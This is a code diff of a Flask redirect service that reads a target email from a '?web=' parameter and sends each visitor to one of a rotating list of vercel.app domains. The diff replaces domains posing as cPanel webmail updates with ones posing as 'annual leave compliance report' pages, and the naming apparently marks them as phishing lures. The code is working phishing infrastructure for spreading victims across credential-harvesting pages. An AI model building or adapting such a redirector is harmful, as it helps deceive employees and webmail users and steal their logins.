@@ -2,14 +2,18 @@ from flask import Flask, redirect, request
 import os
 
 app = Flask(__name__)
-application = app
 
 DOMAINS = [
-    'https://cpane-llwebmail-update-3-6-2-zip.vercel.app',
-    'https://cpanellupdate-2-3-1-zip-vigilant-gi.vercel.app',
-    'https://cpane-llwebmail-update-3-6-2-zip-sable.vercel.app',
-    'https://webmail-cpanel-update-2-3-1-zip.vercel.app',
-    'https://cpane-lwebmaiil-update-5-3-2-zip.vercel.app'
+	'https://annual-leave-compliance-report-2056.vercel.app',
+	'https://annual-leave-compliance-report-205.vercel.app',
+	'https://annual-leave-compliance-reports-944.vercel.app',
+	'https://annual-leave-compliance-reports-966.vercel.app',
+	'https://annual-leave-compliance-reports-113.vercel.app',
+	'https://annual-leave-compliance-reports-122.vercel.app',
+	'https://annual-leave-compliance-reports-221.vercel.app',
+	'https://annual-leave-compliance-reports-233.vercel.app',
+	'https://annual-leave-compliance-reports-311.vercel.app',
+	'https://annual-leave-compliance-reports-323.vercel.app'
 ]
 
 # Initialize counter
@@ -23,7 +27,7 @@ def round_robin_balancer():
     
     # Basic email validation
     if not email or '@' not in email or '.' not in email:
-        return "Invalid email. Use: ?web=email@example.com", 400
+        return "Invalid email. Use: ?web=youremail@example.com", 400
     
     # Get next domain in round-robin sequence
     target_domain = DOMAINS[current_index]
